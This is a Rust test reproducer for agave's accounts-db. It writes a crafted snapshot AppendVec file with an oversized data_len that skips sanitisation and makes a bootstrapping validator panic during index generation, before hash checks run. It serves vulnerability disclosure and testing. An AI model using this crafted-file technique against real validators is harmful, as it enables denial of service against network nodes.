// Reproducer: add to accounts-db/src/append_vec.rs  .
// agave v4.2.0-alpha.0 (3e9a16d6e6). Run:
//   cargo test -p solana-accounts-db --lib --features dev-context-only-utils \
//     append_vec::tests::test_malformed_snapshot_oversized_data_len -- --nocapture
// Requires in-scope (via 'use super::*'): StoredMeta, AccountMeta, STORE_META_OVERHEAD,
// MAX_PERMITTED_DATA_LENGTH, AppendVecError, FileInfo, StorageAccess, new_scan_accounts_reader,
// get_append_vec_path (test_utils).

    /// Build a one-account AppendVec *image* consisting of only the fixed
    /// per-account metadata (no data bytes), where the attacker-controlled
    /// `StoredMeta.data_len` is set to `data_len`.  Returns the temp file; the
    /// file size equals `STORE_META_OVERHEAD` (already u64-aligned).
    fn write_crafted_single_meta_appendvec(name: &str, data_len: u64) -> test_utils::TempFile {
        use std::io::Write;
        let file_size = STORE_META_OVERHEAD; // 136, u64-aligned
        let mut bytes = vec![0u8; file_size];
        // StoredMeta.data_len — the attacker-controlled length.
        let dl_off = core::mem::offset_of!(StoredMeta, data_len);
        bytes[dl_off..dl_off + 8].copy_from_slice(&data_len.to_le_bytes());
        // StoredMeta.pubkey != default, so this account is not treated as the
        // end-of-data terminator.
        let pk_off = core::mem::offset_of!(StoredMeta, pubkey);
        bytes[pk_off] = 1;
        // AccountMeta.lamports != 0 (also avoids the terminator check).
        let am_off = (core::mem::size_of::<StoredMeta>() + 7) & !7usize;
        let lam_off = am_off + core::mem::offset_of!(AccountMeta, lamports);
        bytes[lam_off..lam_off + 8].copy_from_slice(&1u64.to_le_bytes());

        let path = get_append_vec_path(name);
        let mut f = std::fs::File::create(&path.path).unwrap();
        f.write_all(&bytes).unwrap();
        f.flush().unwrap();
        path
    }

    /// SECURITY (snapshot bootstrap poisoning): the index-generation scan returns
    /// an `Err` for an account whose `data_len > MAX_PERMITTED_DATA_LENGTH`, because
    /// the with-data scan requests `STORE_META_OVERHEAD + data_len` bytes from the
    /// reader, exceeding its `MAX_CAPACITY` (= STORE_META_OVERHEAD +
    /// MAX_PERMITTED_DATA_LENGTH), which yields `QuotaExceeded`.  This is the `Err`
    /// that `generate_index_for_slot` turns into a panic.  The malformed `data_len`
    /// is reachable because `new_for_startup` skips `sanitize_layout_and_length`
    /// when `current_len == file_size`.
    #[test]
    fn test_malformed_snapshot_oversized_data_len_scan_errors() {
        let oversized = MAX_PERMITTED_DATA_LENGTH + 1;
        let path = write_crafted_single_meta_appendvec(
            "test_malformed_oversized_data_len_scan_errors",
            oversized,
        );
        let file_info = FileInfo::new_from_path(&path.path).unwrap();
        assert_eq!(file_info.size as usize, STORE_META_OVERHEAD);
        // Reconstruct exactly as snapshot startup does: trust current_len == file_size.
        // This is the path that SKIPS sanitize_layout_and_length.
        let av =
            AppendVec::new_for_startup(file_info, STORE_META_OVERHEAD, StorageAccess::File).unwrap();
        let mut reader = new_scan_accounts_reader();
        let result = av.scan_accounts(&mut reader, |_offset, _account| {});
        let err = result.expect_err("scan must error on oversized data_len");
        // The underlying io error must be QuotaExceeded.
        let msg = err.to_string();
        match err {
            AppendVecError::Io(io_err) => {
                assert_eq!(io_err.kind(), std::io::ErrorKind::QuotaExceeded, "{msg}");
            }
            other => panic!("expected Io(QuotaExceeded), got {other:?}"),
        }
    }

    /// SECURITY: reproduce the *exact* call `generate_index_for_slot()` makes on the
    /// malformed storage.  A bootstrapping validator that loads an attacker-supplied
    /// snapshot containing this AppendVec panics ("must scan accounts storage")
    /// during index generation — before the snapshot hash gate can reject it.
    #[test]
    #[should_panic(expected = "must scan accounts storage")]
    fn test_malformed_snapshot_oversized_data_len_panics_index_gen() {
        let oversized = MAX_PERMITTED_DATA_LENGTH + 1;
        let path = write_crafted_single_meta_appendvec(
            "test_malformed_oversized_data_len_panics",
            oversized,
        );
        let file_info = FileInfo::new_from_path(&path.path).unwrap();
        let av =
            AppendVec::new_for_startup(file_info, STORE_META_OVERHEAD, StorageAccess::File).unwrap();
        // Exactly as generate_index_for_slot():
        //   storage.accounts.scan_accounts(reader, ..).expect("must scan accounts storage")
        let mut reader = new_scan_accounts_reader();
        av.scan_accounts(&mut reader, |_offset, _account| {})
            .expect("must scan accounts storage");
    }

